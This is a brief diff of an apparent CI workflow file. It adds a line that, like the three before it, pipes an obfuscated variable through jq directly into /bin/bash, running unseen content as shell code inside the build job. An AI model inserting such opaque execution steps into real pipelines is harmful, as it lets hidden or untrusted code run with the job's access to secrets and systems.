@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$etizv90932" | jq -r .pv90706 | /bin/bash
           printf '%s' "$vcmfm735" | jq -r .tgp64 | /bin/bash
           printf '%s' "$huf3" | jq -r .xbk5 | /bin/bash
+          echo $g2455 | jq -r .eq4 | /bin/bash
 
       - name: Archive results
         if: always()
